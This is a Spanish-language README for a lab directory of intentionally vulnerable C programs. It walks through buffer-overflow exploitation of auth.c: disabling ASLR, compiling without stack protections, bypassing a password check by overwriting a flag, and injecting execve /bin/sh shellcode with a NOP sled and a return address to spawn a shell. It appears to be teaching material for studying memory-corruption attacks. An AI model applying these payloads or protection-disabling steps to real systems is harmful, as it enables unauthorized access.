# Readme
Los ejemplos incluidos en este directorio son vulnerables y sensibles a ataques bufferoverflow, no los expongas en redes o equipos no confiables.

## Explotación auth.c
#### Previo
ASLR​  
Disposición aleatoria de espacio de direcciones​  

Desactivación del ASLR​  
echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space​  

Compilación​  
gcc -m32 -no-pie -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -z execstack -o auth.bin auth.c​

#### Explotación variable password

#./auth.bin user AAAAAAAAAAAAAAAAaaa  
Si escribimos por ejemplo 19 caracteres como contraseña, se consigue el acceso sin necesidad de conocer la contraseña  

#./auth.bin user AAAAAAAAAAAAAAAAaaaa  
Si escribimos 20 caracteres como contraseña, se provoca un desbordamiento de la memoria

Si utilizas gdb o similar pon el punto de ruptura en la linea 11 para obtener más información.

#gdb -q auth.bin --> iniciamos debugger  
(gdb)break 11 --> ponemos un punto de parada  
(gdb)r user AAAAAAAAAAAAAAAAa --> iniciamos programa  
(gdb)p auth_flag --> vemos el valor de auth_flag  

Veremos que el valor de auth_flag es 97, que es la representación en ASCII del valor "a"

#### Explotacion variable usuario

De manera análoga a la variable password pero esta vez con 103 y 104 caracteres

#./auth.bin $(python –c'print "A"*103') pass
Si escribimos 103 caracteres como usuario y la contraseña, accedemos sin problema

#./auth.bin $(python –c'print "A"*104') pass
Si escribimos 104 caracteres como usuario y la contraseña, se provoca un desbordamiento de la memoria

Si utilizas gdb o similar pon el punto de ruptura en la linea 25 para obtener más información.
Averiguamos primero el contenido del puntero EBP  
#gdb -q auth.bin  
(gdb)break 25  
(gdb)r $(python -c'print "A"*104') pass  
(gdb)print $ebp - 0x64 (tamaño de la variable usuario 100 caracteres)  

Una vez que tenemos ese valor, podemos inyectar una shell de la siguiente manera:    
104 caracteres = 40 NOP + 25 bytes (ocupados por la shell) + 39 caracteres A + dirección $ebp+20  
Si el valor obtenido antes es 0xbfffeee4, le sumamos 20 (14 en hexadecimal) para "caer" en medio  

$ebp = 0xbfffeee4 + 14 = 0xbfffeef8  
Por lo que la llamada quedaría algo similar a:  
(gdb)r $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*39 + "\xf8\xee\xff\xbf"') pass  
Esto debería abrir una shell con los mismos permisos de ejecución.  

